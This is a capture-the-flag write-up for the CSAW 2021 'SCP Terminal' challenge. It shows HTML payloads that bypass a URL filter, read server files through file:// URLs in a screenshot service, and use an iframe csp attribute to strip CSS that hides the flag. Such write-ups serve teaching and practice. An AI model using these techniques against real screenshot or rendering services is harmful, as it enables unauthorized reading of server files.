```text
Every since you started working this administrative government job, things have gotten strange. It's not just because your day is spent cataloging an archive of anomalous objects. In your dreams you see a burning number: 31337 Maybe this terminal can help uncover the meaning of these dreams.
```

![](/ctf/csaw-quals-2021/scp_terminal_landing.png)

The Explore Archive button opens up a random SCP-wiki page and the Contain SCP button will open up the provided URL on the server and show a screenshot. It'll only work if the URL contains "scp-" so I added "?test=scp-wiki" to the end of the URL to bypass the check. 

# Enumeration

Using the URL "view-source:file:///server?test=scp-wiki" prints a list of all the server files. I used view-source because it wasn't rendering the file listing directly for some reason. 

![](/ctf/csaw-quals-2021/scp_terminal_serverdir.png)

There are a few interesting files there; but let's look at server.py first.

![](/ctf/csaw-quals-2021/scp_terminal_serverpy.png)

Hey, we have arbitrary file read; What if I just view the flag template? 

![](/ctf/csaw-quals-2021/scp_terminal_scp31337.png)

Ahahaha I should've expected that. The next thing I tried was viewing the source, but the viewport wasn't big enough to see the flag. I was stuck on this stage for a while until I found some functionality which let me upload a file to the server by viewing a page like this. 

```html
<html>
<head>
</head>
<body>
<div class="scp-image-block">
	<img  src="http://822f-128-194-3-233.ngrok.io/exploit.html">
</div>
</body>
</html>
```

![](/ctf/csaw-quals-2021/scp_terminal_contain.png)

The server won't serve contained non-image files but it doesn't matter all that much because we have arbitrary file read by way of file://. I actually wrote a payload that worked in my testing, was really excited to test on the server only to find it didn't work -- Firefox considers file <-> file to be the same origin but Chrome does not so I couldn't access the contents of the iframe. I read the documentation on iframes and found the csp attribute; which lets me control the content security policy of the child page. The flag was in the viewport of scp_31337.html, just obfuscated by css. I wrote a quick HTML to iframe the file with CSS disabled and then got the flag. 

```html
<html>
<head>
</head>
<body>
<iframe id="frame" src="file:///server/templates/scp-31337.html"
            title="iframe Example 1" width="720" height="400" csp="style-src none">
</iframe>
</body>
</html>
```
![](/ctf/csaw-quals-2021/scp_terminal_flag.png)